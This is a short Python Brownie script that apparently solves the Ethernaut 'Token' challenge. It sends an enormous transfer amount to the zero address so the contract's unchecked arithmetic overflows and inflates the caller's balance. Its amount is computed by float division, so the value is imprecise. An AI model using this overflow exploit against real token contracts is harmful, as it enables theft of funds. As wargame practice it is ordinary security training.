from brownie import Token
from scripts.challenge_utils import (
    connect_to_challenge, get_acc
)

ETHERNAUT_INSTANCE = '0x8FA13397Eb13506974688c4392c207e4FF68a05A'
DEAD = '0x' + '0' * 40

def main():
    connect_to_challenge()
    acc = get_acc()
    contract = Token.at(ETHERNAUT_INSTANCE)
    
    # NOTE big number for overflow
    max_neg = ((2**256) - 1)/1.5
    contract.transfer(DEAD, max_neg, {'from': acc}).wait(1)
    print(f'bal = {contract.balanceOf(acc)}')

